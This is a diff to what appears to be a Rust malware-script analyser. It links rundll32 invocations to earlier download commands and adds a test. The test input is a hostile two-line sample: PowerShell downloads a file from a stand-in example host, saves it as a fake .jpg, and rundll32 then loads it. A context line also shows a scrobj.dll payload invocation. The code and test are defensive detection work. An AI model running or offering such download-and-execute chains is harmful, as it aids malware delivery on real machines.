@@ -3935,6 +3935,8 @@ fn analyze_inner(input: &[u8], cfg: &Config, file_path: Option<std::path::PathBu
     ps1_bodies.append(&mut env.all_extracted_ps1);
     env.all_extracted_ps1 = ps1_bodies;
     profile_mark!("payload_unc_webdav");
+    resolve_rundll32_download_urls(&mut env.traits);
+    profile_mark!("resolve_rundll32_download_urls");
     // Filter out Download traits whose `src` URL is noise (unresolved
     // `%%X` loop vars, `%foo%` undefined refs, bad IPs, well-known scrape
     // hosts). Several handlers (cmd.rs, curl.rs) push Trait::Download
@@ -4719,6 +4721,55 @@ fn semantic_dedup_key(t: &Trait) -> Option<String> {
         } => Some(format!("UncWebDavC2\0{share_path}\0{http_url}")),
         _ => None,
     }
+}
+
+fn resolve_rundll32_download_urls(traits: &mut [Trait]) {
+    let downloads: std::collections::HashMap<String, String> = traits
+        .iter()
+        .filter_map(|t| match t {
+            Trait::Download {
+                src,
+                dst: Some(dst),
+                ..
+            } if !dst.is_empty() => Some((dst.to_ascii_lowercase(), src.clone())),
+            Trait::CertutilDownload { url, dst } | Trait::BitsadminDownload { url, dst }
+                if !dst.is_empty() =>
+            {
+                Some((dst.to_ascii_lowercase(), url.clone()))
+            }
+            _ => None,
+        })
+        .collect();
+    if downloads.is_empty() {
+        return;
+    }
+    for t in traits {
+        let Trait::Rundll32 { cmd, url } = t else {
+            continue;
+        };
+        if url.is_some() {
+            continue;
+        }
+        let Some(candidate) = rundll32_load_candidate(cmd) else {
+            continue;
+        };
+        if let Some(src) = downloads.get(&candidate.to_ascii_lowercase()) {
+            *url = Some(src.clone());
+        }
+    }
+}
+
+fn rundll32_load_candidate(cmd: &str) -> Option<String> {
+    let tokens = crate::handlers::util::split_words(cmd);
+    let first_arg = tokens.get(1)?;
+    let candidate = first_arg
+        .split(',')
+        .next()
+        .unwrap_or("")
+        .trim()
+        .trim_matches(['"', '\''])
+        .trim_end_matches(['"', '\'', ')', ']', '}', ';']);
+    (!candidate.is_empty()).then(|| candidate.to_string())
 }
 
 fn dedup_traits(traits: &mut Vec<Trait>, max_per_kind: u32) {
@@ -10073,6 +10124,27 @@ rundll32.exe scrobj.dll,GenerateTypeLib payload.sct"#,
             }),
             "rundll32 basename DLL did not resolve full-path download source: {:?}",
             env.traits
+        );
+    }
+
+    #[test]
+    fn rundll32_resolves_late_powershell_download_destination() {
+        let report = crate::analyze(
+            br#"powershell invoke-webrequest -uri http://rundll32-late.example/images/62.gif -outfile c:\programdata\COIm.jpg
+rundll32 c:\programdata\COIm.jpg,init"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Rundll32 { cmd, url: Some(url) }
+                        if cmd == r#"rundll32 c:\programdata\COIm.jpg,init"#
+                            && url == "http://rundll32-late.example/images/62.gif"
+                )
+            }),
+            "rundll32 did not resolve late PowerShell download destination: {:?}",
+            report.traits
         );
     }
 
